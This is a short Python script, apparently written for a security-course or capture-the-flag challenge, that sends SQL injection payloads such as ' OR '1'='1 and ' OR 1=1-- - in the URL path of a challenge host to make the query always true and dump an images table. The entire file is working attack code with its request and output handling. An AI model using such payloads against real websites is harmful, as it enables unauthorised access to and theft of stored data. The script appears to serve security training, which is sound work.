# exploit_sqli.py — enumerate columns and dump the images table via UNION
import requests, urllib.parse

BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"

def q(payload):
    url = f"{BASE}/images/{urllib.parse.quote(payload)}"
    r = requests.get(url)
    return r.status_code, r.text

# 1) simplest: make the WHERE always true -> dump everything
for p in ["' OR '1'='1", "' OR 1=1-- -", "' OR 1=1;-- -"]:
    sc, body = q(p)
    print(repr(p), sc, body[:300])
    print("-"*60)
